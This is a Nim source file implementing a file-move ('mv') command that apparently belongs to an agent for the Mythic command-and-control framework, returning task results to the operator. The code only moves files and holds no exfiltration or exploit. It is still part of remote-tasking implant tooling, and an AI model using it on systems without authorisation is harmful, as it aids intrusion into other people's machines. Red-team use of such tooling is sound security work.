import ../config
import ../utils/mythic_responses
import std/[json, os, strformat]

type
  MvArgs = object
    source: string
    destination: string

proc mvFile*(taskId: string, params: string): JsonNode =
  let cfg = getConfig()
  
  # Parse arguments
  let args = parseJson(params).to(MvArgs)
  
  if cfg.debug:
    echo &"[DEBUG] Moving '{args.source}' to '{args.destination}'"
  
  try:
    # Check if source exists
    if not fileExists(args.source) and not dirExists(args.source):
      return mythicError(taskId, &"Source path does not exist: {args.source}")
    
    # Get absolute source path
    let srcPath = if isAbsolute(args.source):
      args.source
    else:
      getCurrentDir() / args.source
    
    let absSrcPath = if fileExists(srcPath) or dirExists(srcPath):
      normalizedPath(srcPath)
    else:
      return mythicError(taskId, &"Source path does not exist: {srcPath}")
    
    # Handle destination path
    var destPath = if isAbsolute(args.destination):
      args.destination
    else:
      getCurrentDir() / args.destination
    
    # If destination is a directory, append source filename
    if dirExists(destPath):
      let (_, name, ext) = splitFile(absSrcPath)
      destPath = destPath / (name & ext)
    
    # Move/rename the file
    os.moveFile(absSrcPath, destPath)
    
    let normalizedDest = normalizedPath(destPath)
    
    if cfg.debug:
      echo &"[DEBUG] Moved '{absSrcPath}' to '{normalizedDest}'"
    
    return mythicSuccess(taskId, &"Moved '{absSrcPath}' to '{normalizedDest}'")
    
  except OSError as e:
    return mythicError(taskId, &"Failed to move: {e.msg}")
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
